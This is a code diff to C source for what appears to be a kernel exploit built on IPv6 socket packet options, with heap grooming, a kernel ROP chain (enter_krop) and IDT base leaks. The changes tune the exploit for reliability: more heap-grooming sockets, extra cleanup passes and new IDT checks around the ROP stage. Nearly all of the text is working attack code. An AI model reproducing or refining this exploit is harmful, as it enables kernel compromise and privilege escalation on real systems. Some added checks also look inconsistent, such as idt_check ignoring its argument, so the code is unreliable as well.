@@ -164,7 +164,6 @@ int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long 
     return tclass & 0xffff;
 }
 
-
 // Invokes a string ROP to get the IDT base
 unsigned long long __builtin_gadget_addr(const char*);
 unsigned long long rop_call_funcptr(void(*)(void*), ...);
@@ -193,6 +192,23 @@ void sidt(unsigned long long* addr, unsigned short* size) {
 }
 
 
+int verify_idt(unsigned long long expected_base) {
+    unsigned long long current_base;
+    unsigned short current_size;
+    sidt(&current_base, &current_size);
+    return (current_base == expected_base);
+}
+
+int idt_check(uint64_t original_base) {
+    unsigned long long current_base;
+    unsigned short current_size;
+
+    sidt(&current_base, &current_size);
+    if (current_size < 0xFF) return 0;
+
+    return 1; // IDT stable
+}
+
 // Assign the process to a specific core
 void pin_to_cpu(int cpu) {
     cpuset_t set;
@@ -211,13 +227,12 @@ static void reset_ipv6_opts(int s) {
 
 void iterative_socket_cleanup(int sock) {
 
-    for (int i = 0; i < 3; i++) {
+    for (int i = 0; i < 5; i++) {
         struct in6_pktinfo safe = {0};
         set_pktinfo(sock, (char*)&safe);
 
         int tclass_reset = -1;
         setsockopt(sock, IPPROTO_IPV6, IPV6_TCLASS, &tclass_reset, sizeof(tclass_reset));
-
         setsockopt(sock, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0);
         setsockopt(sock, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, NULL, 0);
 
@@ -267,7 +282,7 @@ int main() {
     krop_master_sock = master_sock * 8;
 	
 	// Prepare pre heap grooming 
-	for(int i = 0; i < 50; i++) {  
+	for(int i = 0; i < 100; i++) {
 		int temp_sock = new_socket();  
 		reset_ipv6_opts(temp_sock);  
 		close(temp_sock);  
@@ -342,7 +357,11 @@ int main() {
 
     set_pktinfo(master_sock, buf);
 
+    if (!verify_idt(idt_base)) continue;
+
     enter_krop();
+
+    if (!idt_check(idt_base)) continue;
 
     iterative_socket_cleanup(master_sock);
 
